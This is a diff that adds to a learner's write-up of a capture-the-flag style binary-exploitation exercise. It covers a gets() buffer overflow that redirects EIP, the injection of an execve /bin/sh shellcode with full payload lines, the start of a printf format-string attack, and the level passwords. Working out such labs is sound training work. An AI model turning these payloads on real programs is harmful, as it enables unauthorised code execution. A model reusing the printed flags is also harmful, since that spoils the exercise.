@@ -38,11 +38,127 @@ We look at the pseudo code, we need to enter the if condition : 0x1a7 is the hex
 we execute the binary with this param:
 it enters a shell
 with id we see that we are already level1
-
+so we can access directly the password of level1 :
 
 cat /home/user/level1/.pass
 
 password for level1: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
 
 level1:
+
+the binary makes a call to the 'gets' function, which shoud never be used:
+in the man, 'no check for buffer overrun is performed.'
+
+that's in the main function, but there's another one : the run function.
+It writes using fwrite, then launch a shell using system("/bin/sh/")
+so we have to launch that function.
+
+we have to overrun the buffer of gets to call the run function.
+the address of run is : 0x08048444 (it never changes because there's no ASLR !!)
+
+we need to put the address of the run function in the EIP (Extended Instruction Pointer).
+Because the EIP contains the address of the next instruction !
+
+Now we need to know the offset of EIP :
+python -c 'print "a" * 76 + "B" * 4' > /tmp/exploit
+gdb ./level1
+r < /tmp/exploit
+
+we get 0x42424242 in ?? (), and 0x42424242 is 'BBBB', so the offset is 76 !
+Or in ghidra : its local_50 which is used, and its defined by [76] !
+
+so now we correctly write our exploit, and carefully write the address in little-endian (reversed)
+
+python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
+
+It worked, but the shell dissapeared instantly so we cant do much. (non-interactive shell)
+It exit because he sees EOF in the stdin.
+The turnaroud is to 'open a shell from a pipelined process'
+
+cat /tmp/exploit - | ./level1
+
+now we can just cat the password :
+
+cat /home/user/level2/.pass
+
+
+pass level2 : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+
+level2:
+
+The main function calls the p function.
+
+it first flush the stdout, then call gets with a buffer of 76 !
+But then there's an if statement that makes sure that we cant point the return adress to the stack, so we cant use that.
+
+But, strdup makes a call to malloc, so it sends the buffer of 76 to the heap...
+
+so we have to exploit the heap to execute a level3 shell ?
+
+NO we have to input what we call a shellcode.
+so we inject an exploit, with the shellcode, fill it enough so that i reaches the eip, and because of the if statement we cant redirect it, so we just put back the normal return address.
+
+but which address ?
+
+using ltrace, we can see that the return adress is always the same : 0x0804a008 (thx to no ASLR)
+
+i found this shellcode for 32 bits, only 21 bytes :
+
+"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+
+now let's find the offset to write over the eip address
+
+python -c 'print "a" * 80 + "B" * 4' > /tmp/exploit
+
+we get 0x42424242, so its 80 !.
+
+Lets now write the payload :
+
+python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit2
+
+password for level3 : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+level3:
+
+again the main calls the v function.
+
+What it does is create a buffer, call to fgets to get input from user, print it then checks if m == 0x40(64/'@') ??
+
+fgets is protected from buffer overflows.
+
+We need to enter that if statement, it will launch a shell.
+
+printf is apparently vulnerable to a "format string exploit".
+
+after the printf calls, in gdb. its comparing a value in address 0x804988c = its the m global variable, so that is what we have to modify to 64.
+
+so the printf is vulnerable because there's no format so in input we can do that.
+
+we can use the %x format to print the stack addresses
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
